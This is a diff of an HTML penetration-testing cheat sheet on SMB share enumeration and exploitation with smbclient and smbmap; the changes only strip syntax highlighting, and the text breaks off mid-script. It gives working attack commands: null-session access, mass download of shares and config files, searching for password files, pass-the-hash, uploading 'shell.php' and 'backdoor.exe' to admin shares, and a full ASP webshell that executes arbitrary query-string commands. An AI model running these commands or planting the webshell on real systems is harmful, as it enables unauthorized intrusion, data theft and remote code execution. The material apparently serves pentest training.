@@ -87,17 +87,6 @@
         a:hover {
             text-decoration: underline;
         }
-        /* Force all syntax highlighting spans to black */
-        .codehilite pre span,
-        .codehilite pre span.c, .codehilite pre span.c1, .codehilite pre span.ch,
-        .codehilite pre span.k, .codehilite pre span.kd, .codehilite pre span.kr,
-        .codehilite pre span.m, .codehilite pre span.mi,
-        .codehilite pre span.n, .codehilite pre span.nb, .codehilite pre span.nc, .codehilite pre span.nf, .codehilite pre span.nv,
-        .codehilite pre span.o,
-        .codehilite pre span.p, .codehilite pre span.py,
-        .codehilite pre span.s, .codehilite pre span.s1, .codehilite pre span.s2, .codehilite pre span.se,
-        .codehilite pre span.w { color: #000000 !important; }
-        pre span { color: #000000 !important; }
         @media print {
             body { margin: 0; padding: 10px; }
             pre { page-break-inside: avoid; }
@@ -131,19 +120,19 @@
 <h3 id="cachyos-arch-linux">CachyOS (Arch Linux)</h3>
 
 <div class="codehilite">
-<pre><span></span><code>sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>samba
-which<span class="w"> </span>smbclient<span class="w"> </span>smbmap
-smbclient<span class="w"> </span>--version
+<pre><code>sudo pacman -S samba
+which smbclient smbmap
+smbclient --version
 </code></pre>
 </div>
 
 <h3 id="install-smbmap-if-not-included">Install smbmap (if not included)</h3>
 
 <div class="codehilite">
-<pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/ShawnDEvans/smbmap.git
-<span class="nb">cd</span><span class="w"> </span>smbmap
-chmod<span class="w"> </span>+x<span class="w"> </span>smbmap.py
-<span class="c1"># Run with: python3 smbmap.py</span>
+<pre><code>git clone https://github.com/ShawnDEvans/smbmap.git
+cd smbmap
+chmod +x smbmap.py
+# Run with: python3 smbmap.py
 </code></pre>
 </div>
 
@@ -192,7 +181,7 @@ chmod<span class="w"> </span>+x<span class="w"> </span>smbmap.py
 <h3 id="1-list-available-shares-no-credentials">1. <strong>List Available Shares (No Credentials)</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-N
+<pre><code>smbclient -L 192.168.1.100 -N
 </code></pre>
 </div>
 
@@ -215,22 +204,22 @@ chmod<span class="w"> </span>+x<span class="w"> </span>smbmap.py
 <h3 id="2-list-shares-with-credentials">2. <strong>List Shares with Credentials</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-U<span class="w"> </span>administrator%password
-smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;DOMAIN\username%password&quot;</span>
+<pre><code>smbclient -L 192.168.1.100 -U administrator%password
+smbclient -L 192.168.1.100 -U &quot;DOMAIN\username%password&quot;
 </code></pre>
 </div>
 
 <h3 id="3-connect-to-a-share">3. <strong>Connect to a Share</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Without credentials (null session):</span>
-smbclient<span class="w"> </span>//192.168.1.100/share1<span class="w"> </span>-N
+<pre><code># Without credentials (null session):
+smbclient //192.168.1.100/share1 -N
 
-<span class="c1"># With credentials:</span>
-smbclient<span class="w"> </span>//192.168.1.100/admin$<span class="w"> </span>-U<span class="w"> </span>administrator%password
+# With credentials:
+smbclient //192.168.1.100/admin$ -U administrator%password
 
-<span class="c1"># You&#39;re now in SMB prompt:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span>
+# You&#39;re now in SMB prompt:
+smb: \&gt;
 </code></pre>
 </div>
 
@@ -239,54 +228,54 @@ smb:<span class="w"> </span><span class="se">\&gt;</span>
 <p>Once connected, you can use these commands:</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># List files:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>dir
+<pre><code># List files:
+smb: \&gt; ls
+smb: \&gt; dir
 
-<span class="c1"># Change directory:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>documents
-smb:<span class="w"> </span><span class="se">\d</span>ocuments<span class="se">\&gt;</span><span class="w"> </span>
+# Change directory:
+smb: \&gt; cd documents
+smb: \documents\&gt; 
 
-<span class="c1"># Download file:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>filename.txt
-<span class="c1"># File downloaded to your local machine</span>
+# Download file:
+smb: \&gt; get filename.txt
+# File downloaded to your local machine
 
-<span class="c1"># Download entire directory:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>recurse<span class="w"> </span>on
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mget<span class="w"> </span>*
-<span class="c1"># Downloads all files recursively</span>
+# Download entire directory:
+smb: \&gt; recurse on
+smb: \&gt; mget *
+# Downloads all files recursively
 
-<span class="c1"># Upload file (if write permission):</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>put<span class="w"> </span>local_file.txt
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>lcd<span class="w"> </span>/path/on/your/machine
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mput<span class="w"> </span>*.txt<span class="w">  </span><span class="c1"># Upload multiple files</span>
+# Upload file (if write permission):
+smb: \&gt; put local_file.txt
+smb: \&gt; lcd /path/on/your/machine
+smb: \&gt; mput *.txt  # Upload multiple files
 
-<span class="c1"># View file info:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>stat<span class="w"> </span>filename.txt
+# View file info:
+smb: \&gt; stat filename.txt
 
-<span class="c1"># Delete file (if write permission):</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>del<span class="w"> </span>filename.txt
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>rmdir<span class="w"> </span>dirname
+# Delete file (if write permission):
+smb: \&gt; del filename.txt
+smb: \&gt; rmdir dirname
 
-<span class="c1"># Create directory:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mkdir<span class="w"> </span>newdir
+# Create directory:
+smb: \&gt; mkdir newdir
 
-<span class="c1"># Exit SMB prompt:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span><span class="nb">exit</span>
+# Exit SMB prompt:
+smb: \&gt; exit
 </code></pre>
 </div>
 
 <h3 id="5-download-specific-files">5. <strong>Download Specific Files</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Single file:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;get config.ini&quot;</span>
+<pre><code># Single file:
+smbclient //192.168.1.100/share -N -c &quot;get config.ini&quot;
 
-<span class="c1"># Multiple files:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;mget *.txt *.conf&quot;</span>
+# Multiple files:
+smbclient //192.168.1.100/share -N -c &quot;mget *.txt *.conf&quot;
 
-<span class="c1"># Recursive download:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;recurse on; mget *&quot;</span>
+# Recursive download:
+smbclient //192.168.1.100/share -N -c &quot;recurse on; mget *&quot;
 </code></pre>
 </div>
 
@@ -298,8 +287,8 @@ smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N
 <p>If share is writable, upload webshell or malware:</p>
 
 <div class="codehilite">
-<pre><span></span><code>smbclient<span class="w"> </span>//192.168.1.100/web<span class="w"> </span>-U<span class="w"> </span>user%pass<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;put shell.php&quot;</span>
-smbclient<span class="w"> </span>//192.168.1.100/admin$<span class="w"> </span>-U<span class="w"> </span>admin%admin<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;put backdoor.exe&quot;</span>
+<pre><code>smbclient //192.168.1.100/web -U user%pass -c &quot;put shell.php&quot;
+smbclient //192.168.1.100/admin$ -U admin%admin -c &quot;put backdoor.exe&quot;
 </code></pre>
 </div>
 
@@ -312,7 +301,7 @@ smbclient<span class="w"> </span>//192.168.1.100/admin$<span class="w"> </span>-
 <h3 id="1-quick-share-enumeration">1. <strong>Quick Share Enumeration</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100
+<pre><code>smbmap -H 192.168.1.100
 </code></pre>
 </div>
 
@@ -333,16 +322,16 @@ smbclient<span class="w"> </span>//192.168.1.100/admin$<span class="w"> </span>-
 <h3 id="2-enumeration-with-credentials">2. <strong>Enumeration with Credentials</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-p<span class="w"> </span>password
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;DOMAIN\user&quot;</span><span class="w"> </span>-p<span class="w"> </span>password
+<pre><code>smbmap -H 192.168.1.100 -u administrator -p password
+smbmap -H 192.168.1.100 -u &quot;DOMAIN\user&quot; -p password
 </code></pre>
 </div>
 
 <h3 id="3-list-files-in-share">3. <strong>List Files in Share</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R<span class="w"> </span>share1
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R<span class="w"> </span>C$<span class="w"> </span>-q<span class="w">  </span><span class="c1"># Quiet mode</span>
+<pre><code>smbmap -H 192.168.1.100 -u admin -p password -R share1
+smbmap -H 192.168.1.100 -u admin -p password -R C$ -q  # Quiet mode
 </code></pre>
 </div>
 
@@ -353,22 +342,22 @@ smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</spa
 <h3 id="4-find-specific-file-types">4. <strong>Find Specific File Types</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Find all Word documents:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R<span class="w"> </span><span class="s2">&quot;*.docx&quot;</span>
+<pre><code># Find all Word documents:
+smbmap -H 192.168.1.100 -u admin -p password -R &quot;*.docx&quot;
 
-<span class="c1"># Find config files:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R<span class="w"> </span><span class="s2">&quot;*config*&quot;</span>
+# Find config files:
+smbmap -H 192.168.1.100 -u admin -p password -R &quot;*config*&quot;
 
-<span class="c1"># Find backups:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R<span class="w"> </span><span class="s2">&quot;*.bak;*.backup&quot;</span>
+# Find backups:
+smbmap -H 192.168.1.100 -u admin -p password -R &quot;*.bak;*.backup&quot;
 </code></pre>
 </div>
 
 <h3 id="5-download-specific-file">5. <strong>Download Specific File</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--download<span class="w"> </span><span class="s2">&quot;C</span>$<span class="s2">\config\database.ini&quot;</span>
+<pre><code>smbmap -H 192.168.1.100 -u admin -p password \
+  --download &quot;C$\config\database.ini&quot;
 </code></pre>
 </div>
 
@@ -378,12 +367,12 @@ smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</spa
 <h3 id="6-upload-file-exploitation">6. <strong>Upload File (Exploitation)</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--upload<span class="w"> </span>/tmp/shell.php<span class="w"> </span>share1
+<pre><code>smbmap -H 192.168.1.100 -u admin -p password \
+  --upload /tmp/shell.php share1
 
-<span class="c1"># Or upload to specific location:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--upload<span class="w"> </span>/tmp/shell.exe<span class="w"> </span><span class="s2">&quot;C</span>$<span class="s2">\Windows\Temp&quot;</span>
+# Or upload to specific location:
+smbmap -H 192.168.1.100 -u admin -p password \
+  --upload /tmp/shell.exe &quot;C$\Windows\Temp&quot;
 </code></pre>
 </div>
 
@@ -393,7 +382,7 @@ smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</spa
 <h3 id="7-execute-commands-if-allowed">7. <strong>Execute Commands (if allowed)</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+<pre><code>smbmap -H 192.168.1.100 -u admin -p password -x &quot;whoami&quot;
 </code></pre>
 </div>
 
@@ -403,18 +392,18 @@ smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</spa
 <h3 id="8-scan-range-of-hosts">8. <strong>Scan Range of Hosts</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.0/24
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.<span class="o">{</span><span class="m">50</span>..60<span class="o">}</span>
+<pre><code>smbmap -H 192.168.1.0/24
+smbmap -H 192.168.1.{50..60}
 </code></pre>
 </div>
 
 <h3 id="9-search-for-files-by-pattern">9. <strong>Search for Files by Pattern</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Search entire share for files:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R<span class="w"> </span>.<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--filter<span class="w"> </span><span class="s2">&quot;*password*&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--search
+<pre><code># Search entire share for files:
+smbmap -H 192.168.1.100 -u admin -p password -R . \
+  --filter &quot;*password*&quot; \
+  --search
 </code></pre>
 </div>
 
@@ -521,53 +510,53 @@ smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</spa
 <h3 id="workflow-1-complete-smb-share-enumeration">Workflow 1: Complete SMB Share Enumeration</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Find SMB hosts:</span>
-nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">445</span><span class="w"> </span>--open<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-oG<span class="w"> </span>smb_hosts.txt
+<pre><code># Step 1: Find SMB hosts:
+nmap -p 445 --open 192.168.1.0/24 -oG smb_hosts.txt
 
-<span class="c1"># Step 2: Quick permission check on each:</span>
-<span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>grep<span class="w"> </span><span class="s2">&quot;445/open&quot;</span><span class="w"> </span>smb_hosts.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Checking </span><span class="nv">$host</span><span class="s2">&quot;</span>
-<span class="w">  </span>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$host</span>
-<span class="k">done</span>
+# Step 2: Quick permission check on each:
+for host in $(grep &quot;445/open&quot; smb_hosts.txt | awk &#39;{print $2}&#39;); do
+  echo &quot;[*] Checking $host&quot;
+  smbmap -H $host
+done
 
-<span class="c1"># Step 3: If accessible shares found, list files:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span>-R<span class="w"> </span>share1<span class="w"> </span>-q
+# Step 3: If accessible shares found, list files:
+smbmap -H 192.168.1.50 -R share1 -q
 
-<span class="c1"># Step 4: Download interesting files:</span>
-smbclient<span class="w"> </span>//192.168.1.50/share1<span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;mget *&quot;</span>
+# Step 4: Download interesting files:
+smbclient //192.168.1.50/share1 -N -c &quot;mget *&quot;
 </code></pre>
 </div>
 
 <h3 id="workflow-2-find-and-download-sensitive-files">Workflow 2: Find and Download Sensitive Files</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: List all shares:</span>
-smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-N
+<pre><code># Step 1: List all shares:
+smbclient -L 192.168.1.100 -N
 
-<span class="c1"># Step 2: For each readable share, list files:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share1<span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;recurse on; ls&quot;</span>
+# Step 2: For each readable share, list files:
+smbclient //192.168.1.100/share1 -N -c &quot;recurse on; ls&quot;
 
-<span class="c1"># Step 3: Download files that look interesting:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share1<span class="w"> </span>-N<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;get config.ini; get database.ini; get web.config&quot;</span>
+# Step 3: Download files that look interesting:
+smbclient //192.168.1.100/share1 -N \
+  -c &quot;get config.ini; get database.ini; get web.config&quot;
 </code></pre>
 </div>
 
 <h3 id="workflow-3-exploitation-upload-webshell">Workflow 3: Exploitation (Upload Webshell)</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Enumerate shares:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R
+<pre><code># Step 1: Enumerate shares:
+smbmap -H 192.168.1.100 -u admin -p password -R
 
-<span class="c1"># Step 2: Find writable share connected to web:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R<span class="w"> </span><span class="s2">&quot;C</span>$<span class="s2">\inetpub\wwwroot&quot;</span>
+# Step 2: Find writable share connected to web:
+smbmap -H 192.168.1.100 -u admin -p password -R &quot;C$\inetpub\wwwroot&quot;
 
-<span class="c1"># Step 3: Upload webshell:</span>
-smbclient<span class="w"> </span>//192.168.1.100/C$<span class="w"> </span>-U<span class="w"> </span>admin%password<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;put shell.php inetpub\\wwwroot\\shell.php&quot;</span>
+# Step 3: Upload webshell:
+smbclient //192.168.1.100/C$ -U admin%password \
+  -c &quot;put shell.php inetpub\\wwwroot\\shell.php&quot;
 
-<span class="c1"># Step 4: Access shell via browser:</span>
-<span class="c1"># http://192.168.1.100/shell.php</span>
+# Step 4: Access shell via browser:
+# http://192.168.1.100/shell.php
 </code></pre>
 </div>
 
@@ -578,82 +567,82 @@ smbclient<span class="w"> </span>//192.168.1.100/C$<span class="w"> </span>-U<sp
 <h3 id="example-1-anonymous-smb-access">Example 1: Anonymous SMB Access</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Check for null session:</span>
-smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span>-N
+<pre><code># Check for null session:
+smbclient -L 192.168.1.50 -N
 
-<span class="c1"># If lists shares, try connecting:</span>
-smbclient<span class="w"> </span>//192.168.1.50/share1<span class="w"> </span>-N
+# If lists shares, try connecting:
+smbclient //192.168.1.50/share1 -N
 
-<span class="c1"># In SMB prompt:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>important_file.txt
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span><span class="nb">exit</span>
+# In SMB prompt:
+smb: \&gt; ls
+smb: \&gt; get important_file.txt
+smb: \&gt; exit
 
-<span class="c1"># File now in your local directory</span>
+# File now in your local directory
 </code></pre>
 </div>
 
 <h3 id="example-2-credential-based-access">Example 2: Credential-Based Access</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># List shares with credentials:</span>
-smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;admin%password123&quot;</span>
+<pre><code># List shares with credentials:
+smbclient -L 192.168.1.50 -U &quot;admin%password123&quot;
 
-<span class="c1"># Connect to admin share:</span>
-smbclient<span class="w"> </span>//192.168.1.50/admin$<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;admin%password123&quot;</span>
+# Connect to admin share:
+smbclient //192.168.1.50/admin$ -U &quot;admin%password123&quot;
 
-<span class="c1"># Download all files:</span>
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>recurse<span class="w"> </span>on
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mget<span class="w"> </span>*
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span><span class="nb">exit</span>
+# Download all files:
+smb: \&gt; recurse on
+smb: \&gt; mget *
+smb: \&gt; exit
 </code></pre>
 </div>
 
 <h3 id="example-3-find-and-exploit-writable-share">Example 3: Find and Exploit Writable Share</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Check permissions with smbmap:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-R
+<pre><code># Check permissions with smbmap:
+smbmap -H 192.168.1.50 -u admin -p password -R
 
-<span class="c1"># If find writable directory (e.g., C$):</span>
-<span class="c1"># Create webshell:</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span>shell.asp<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
-<span class="s">&lt;%</span>
-<span class="s">Set objShell = CreateObject(&quot;WScript.Shell&quot;)</span>
-<span class="s">command = Request.QueryString(&quot;cmd&quot;)</span>
-<span class="s">Set objExec = objShell.Exec(command)</span>
-<span class="s">response.write objExec.StdOut.ReadAll()</span>
-<span class="s">%&gt;</span>
-<span class="s">EOF</span>
+# If find writable directory (e.g., C$):
+# Create webshell:
+cat &gt; shell.asp &lt;&lt; &#39;EOF&#39;
+&lt;%
+Set objShell = CreateObject(&quot;WScript.Shell&quot;)
+command = Request.QueryString(&quot;cmd&quot;)
+Set objExec = objShell.Exec(command)
+response.write objExec.StdOut.ReadAll()
+%&gt;
+EOF
 
-<span class="c1"># Upload it:</span>
-smbclient<span class="w"> </span>//192.168.1.50/C$<span class="w"> </span>-U<span class="w"> </span>admin%password<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;put shell.asp windows\\temp\\shell.asp&quot;</span>
+# Upload it:
+smbclient //192.168.1.50/C$ -U admin%password \
+  -c &quot;put shell.asp windows\\temp\\shell.asp&quot;
 
-<span class="c1"># Execute via RDP or network command execution</span>
+# Execute via RDP or network command execution
 </code></pre>
 </div>
 
 <h3 id="example-4-download-entire-share-for-analysis">Example 4: Download Entire Share for Analysis</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="ch">#!/bin/bash</span>
-<span class="c1"># download_smb_share.sh</span>
+<pre><code>#!/bin/bash
+# download_smb_share.sh
 
-<span class="nv">HOST</span><span class="o">=</span><span class="nv">$1</span>
-<span class="nv">SHARE</span><span class="o">=</span><span class="nv">$2</span>
-<span class="nv">USER</span><span class="o">=</span><span class="nv">$3</span>
-<span class="nv">PASS</span><span class="o">=</span><span class="nv">$4</span>
+HOST=$1
+SHARE=$2
+USER=$3
+PASS=$4
 
-mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;./</span><span class="nv">$HOST</span><span class="s2">/</span><span class="nv">$SHARE</span><span class="s2">&quot;</span>
-<span class="nb">cd</span><span class="w"> </span><span class="s2">&quot;./</span><span class="nv">$HOST</span><span class="s2">/</span><span class="nv">$SHARE</span><span class="s2">&quot;</span>
+mkdir -p &quot;./$HOST/$SHARE&quot;
+cd &quot;./$HOST/$SHARE&quot;
 
-smbclient<span class="w"> </span>//<span class="nv">$HOST</span>/<span class="nv">$SHARE</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;recurse on; mget *&quot;</span>
+smbclient //$HOST/$SHARE -U &quot;$USER%$PASS&quot; -c &quot;recurse on; mget *&quot;
 
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Downloaded to </span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="s2">&quot;</span>
+echo &quot;Downloaded to $(pwd)&quot;
 
-<span class="c1"># Run:</span>
-<span class="c1"># ./download_smb_share.sh 192.168.1.50 C$ admin password</span>
+# Run:
+# ./download_smb_share.sh 192.168.1.50 C$ admin password
 </code></pre>
 </div>
 
@@ -664,46 +653,46 @@ smbclient<span class="w"> </span>//<span class="nv">$HOST</span>/<span class="nv
 <h3 id="1-null-session-from-enum4linux-to-smbclient">1. <strong>Null Session from enum4linux to SMBclient</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Enum4linux found these shares...</span>
-<span class="c1"># Now use smbclient to access:</span>
-enum4linux<span class="w"> </span>-S<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w">  </span><span class="c1"># Find shares</span>
+<pre><code># Enum4linux found these shares...
+# Now use smbclient to access:
+enum4linux -S 192.168.1.100  # Find shares
 
-<span class="c1"># Then:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share_found<span class="w"> </span>-N
+# Then:
+smbclient //192.168.1.100/share_found -N
 </code></pre>
 </div>
 
 <h3 id="2-chaining-commands">2. <strong>Chaining Commands</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Multiple commands in sequence:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;cd documents; ls; get file1.txt; get file2.txt&quot;</span>
+<pre><code># Multiple commands in sequence:
+smbclient //192.168.1.100/share -N \
+  -c &quot;cd documents; ls; get file1.txt; get file2.txt&quot;
 </code></pre>
 </div>
 
 <h3 id="3-using-pass-the-hash-with-right-tools">3. <strong>Using Pass the Hash (with right tools)</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># If you have NTLM hash (from hacking):</span>
-pth-smbclient<span class="w"> </span>//192.168.1.100/share1<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;admin%:NTHASH&quot;</span>
+<pre><code># If you have NTLM hash (from hacking):
+pth-smbclient //192.168.1.100/share1 \
+  -U &quot;admin%:NTHASH&quot;
 </code></pre>
 </div>
 
 <h3 id="4-script-smb-enumeration">4. <strong>Script SMB Enumeration</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="ch">#!/bin/bash</span>
-<span class="c1"># enumerate_smb_network.sh</span>
+<pre><code>#!/bin/bash
+# enumerate_smb_network.sh
 
-<span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">192</span>.168.1.<span class="o">{</span><span class="m">50</span>..100<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Scanning </span><span class="nv">$host</span><span class="s2">&quot;</span>
